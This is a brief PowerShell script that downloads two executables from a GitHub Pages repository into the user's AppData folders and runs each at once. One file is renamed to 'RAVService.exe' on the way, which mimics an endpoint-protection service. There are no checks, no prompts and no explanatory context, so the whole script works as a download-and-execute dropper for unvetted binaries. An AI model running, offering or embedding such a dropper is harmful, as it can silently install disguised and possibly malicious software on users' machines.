$x = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/RAVEndpointProtection.exe"
$y = "$env:USERPROFILE\AppData\Local\RAVEndpointProtection.exe"
$a = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/AplicatieUNDO.exe"
$b = "$env:LOCALAPPDATA\RAVService.exe"

Invoke-WebRequest -Uri $x -OutFile $y
Start-Process $y
Invoke-WebRequest -Uri $a -OutFile $b
Start-Process -FilePath $b
